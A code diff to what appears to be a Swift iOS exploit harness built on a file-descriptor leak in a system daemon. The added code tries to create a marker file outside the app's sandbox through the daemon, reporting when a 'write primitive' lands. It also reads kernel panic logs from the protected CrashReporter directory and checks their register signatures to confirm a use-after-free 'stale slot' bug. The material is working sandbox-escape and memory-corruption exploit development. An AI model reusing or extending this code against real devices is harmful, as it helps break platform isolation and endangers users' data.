@@ -112,6 +112,52 @@ ctx.arm("cm.fdleak", "handshake + vend")
                 lines.append(tl("— 对照 —"))
                 lines.append(session.directOpenControl(FdLeak.readableDomain))
 
+                /* THE WRITE PROBE (2026-11-07): the mode-byte question —
+                   O_WRONLY|O_CREAT values through the daemon's open path.
+                   A landed marker = the cross-container WRITE primitive. */
+                let wcand: [(String, UInt64)] = [
+                    ("/var/mobile/Library/Lum1na_fdW_mark.txt", 0x601),   /* O_WRONLY|O_CREAT|O_TRUNC */
+                    ("/var/mobile/Library/Lum1na_fdW_mark.txt", 0x301),   /* alt O_CREAT bit          */
+                    (NSHomeDirectory() + "/Documents/fdw_self.txt", 0x601) /* container control        */
+                ]
+                for (i, wp) in wcand.enumerated() {
+                    let vw = session.vendWriteTest(wp.0, options: wp.1)
+                    lines.append("  write[\(i)] opts=\(String(wp.1, radix: 16)) path=\(wp.0) -> ok=\(vw.ok) \(vw.note)")
+                    if vw.ok { lines.append("  --- THE WRITE PRIMITIVE LANDED \(wp.0)") }
+                }
+
+                /* THE PANIC READER (the 12's auto-scan unlock): the daemon
+                   opens the client path with uid-501 creds — the kernel
+                   panics live under /var/mobile/Library/Logs/CrashReporter.
+                   List the dir, read the newest panic-full, classify in-app
+                   with the signature law. */
+                if case let (pentries, _) = session.list("/var/mobile/Library/Logs/CrashReporter", limit: 50) {
+                    lines.append("  CrashReporter entries=\(pentries.count)")
+                    let panics = pentries.filter { $0.contains("panic") }.sorted().reversed()
+                    if let newest = panics.first {
+                        if let (panData, pv) = session.read("/var/mobile/Library/Logs/CrashReporter/\(newest)", limit: 1_200_000) {
+                            let txt = String(decoding: panData ?? Data(), as: UTF8.self)
+                            var cls = "watchdog/other"
+                            if let pcr = txt.range(of: "pc 0x([0-9a-f]+), lr 0x([0-9a-f]+)", options: .regularExpression) {
+                                let frag = String(txt[pcr.lowerBound..<txt.index(pcr.upperBound, offsetBy: 0)])
+                                let parts = frag.split(separator: " ")
+                                let pcv = UInt64(parts[1].dropFirst(2).dropLast(1), radix: 16) ?? 0
+                                let lrv = UInt64(parts[3].dropFirst(0), radix: 16) ?? 0
+                                let d = lrv &- pcv
+                                let x0r = txt.range(of: "x0:\s*0x([0-9a-f]+)", options: .regularExpression).map { txt[$0] } ?? "?"
+                                cls = (d == 0x115F3C && x0r.contains("0x59")) ? "STALE-SLOT SIG" : "other (\(pcv)-\(lrv), x0=\(x0r))"
+                            } else if txt.contains("element modified after free") {
+                                cls = "GZ-MAF (the 43748 fill class)"
+                            }
+                            lines.append("  PANIC-RDR \(newest) bytes=\(panData?.count ?? 0) -> \(cls)")
+                            if cls.contains("STALE-SLOT") {
+                                lines.append("  --- THE AUTO-SCAN PATH WORKS THROUGH THE DAEMON")
+                            }
+                        }
+                    }
+                }
+                lines.append(session.directOpenControl(FdLeak.readableDomain))
+
                 // existence oracle
                 lines.append("")
                 lines.append(tl("— 存在性预言机 —"))
